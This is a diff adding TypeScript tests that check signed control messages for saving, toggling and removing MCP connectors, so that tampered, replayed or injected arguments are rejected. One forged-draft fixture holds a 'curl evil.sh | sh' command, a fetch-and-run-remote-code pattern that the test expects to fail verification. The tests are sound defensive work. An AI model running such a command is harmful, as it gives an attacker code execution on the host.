@@ -191,3 +191,77 @@ test("verifyControl: arg key order does not affect verification (canonical)", ()
   };
   assert.equal(verifyControl(clientPub(MK), CTRL, clientSignControl(MK, reordered)), true);
 });
+
+// ── mcp_save (MCP connectors over the relay). Unlike channels_save, this rides the
+// GENERIC control envelope: action "mcp_save", args { draft, sealedSecrets }. The app
+// (RemoteDriveContext saveMcp) and the daemon (applyMcpSave -> authorizeControl) must
+// build those args identically — including `sealedSecrets: null` when no credential is
+// being set, which is the easiest thing to get wrong (undefined vs null canonicalize
+// differently). These lock that contract. ────────────────────────────────────────────
+const MCP_DRAFT = {
+  name: "github",
+  transport: "stdio",
+  command: "npx",
+  args: ["-y", "@modelcontextprotocol/server-github"],
+};
+const MCP_SEALED = "c2VhbGVkLWJveC1iYXNlNjQ"; // opaque ciphertext; only its bytes are signed
+const MCP_CTRL: ControlEnvelope = {
+  termId: "routines-abc",
+  ts: 1_752_000_000_000,
+  action: "mcp_save",
+  args: { draft: MCP_DRAFT, sealedSecrets: MCP_SEALED },
+};
+
+test("mcp_save: verifier accepts the app's signature (with a sealed credential)", () => {
+  assert.equal(verifyControl(clientPub(MK), MCP_CTRL, clientSignControl(MK, MCP_CTRL)), true);
+});
+
+test("mcp_save: verifier accepts a credential-less save (sealedSecrets null)", () => {
+  // saveMcp sends `sealedSecrets: sealedSecrets ?? null`; applyMcpSave verifies with
+  // `sealedSecrets: sealedSecrets ?? null`. Both must be null, not undefined.
+  const noSecret: ControlEnvelope = { ...MCP_CTRL, args: { draft: MCP_DRAFT, sealedSecrets: null } };
+  assert.equal(verifyControl(clientPub(MK), noSecret, clientSignControl(MK, noSecret)), true);
+});
+
+test("mcp_save: a null-sealed signature does NOT verify against an injected sealed box", () => {
+  // A hostile relay watches a credential-less save and tries to staple its OWN sealed
+  // box onto it (which the daemon would then open and write as the connector's token).
+  const noSecret: ControlEnvelope = { ...MCP_CTRL, args: { draft: MCP_DRAFT, sealedSecrets: null } };
+  const sig = clientSignControl(MK, noSecret);
+  assert.equal(verifyControl(clientPub(MK), MCP_CTRL, sig), false);
+});
+
+test("mcp_save: rejects a tampered draft (swapped command = arbitrary process spawn)", () => {
+  // The whole point of signing an MCP save: `command` is executed on the host, so a
+  // forged one is RCE. A captured signature must not cover a swapped command.
+  const sig = clientSignControl(MK, MCP_CTRL);
+  const forged: ControlEnvelope = {
+    ...MCP_CTRL,
+    args: { draft: { ...MCP_DRAFT, command: "curl", args: ["evil.sh", "|", "sh"] }, sealedSecrets: MCP_SEALED },
+  };
+  assert.equal(verifyControl(clientPub(MK), forged, sig), false);
+});
+
+test("mcp_save: rejects a swapped sealed box under a captured signature", () => {
+  const sig = clientSignControl(MK, MCP_CTRL);
+  const swapped: ControlEnvelope = { ...MCP_CTRL, args: { draft: MCP_DRAFT, sealedSecrets: "b3RoZXItYm94" } };
+  assert.equal(verifyControl(clientPub(MK), swapped, sig), false);
+});
+
+test("mcp_save: its signature can't be replayed as another mcp action", () => {
+  // Action is part of the signed message, so an mcp_save sig can't become a remove.
+  const sig = clientSignControl(MK, MCP_CTRL);
+  assert.equal(verifyControl(clientPub(MK), { ...MCP_CTRL, action: "mcp_remove" }, sig), false);
+  assert.equal(verifyControl(clientPub(MK), { ...MCP_CTRL, action: "mcp_set_enabled" }, sig), false);
+});
+
+test("mcp_set_enabled / mcp_remove: verifier accepts the app's arg shapes", () => {
+  // Must match RemoteDriveContext: { name, enabled } and { name }.
+  const toggle: ControlEnvelope = { termId: "routines-abc", ts: 1_752_000_000_001, action: "mcp_set_enabled", args: { name: "github", enabled: false } };
+  const remove: ControlEnvelope = { termId: "routines-abc", ts: 1_752_000_000_002, action: "mcp_remove", args: { name: "github" } };
+  assert.equal(verifyControl(clientPub(MK), toggle, clientSignControl(MK, toggle)), true);
+  assert.equal(verifyControl(clientPub(MK), remove, clientSignControl(MK, remove)), true);
+  // Flipping `enabled` under a captured sig must fail (a forged toggle arms a tool surface).
+  const sig = clientSignControl(MK, toggle);
+  assert.equal(verifyControl(clientPub(MK), { ...toggle, args: { name: "github", enabled: true } }, sig), false);
+});
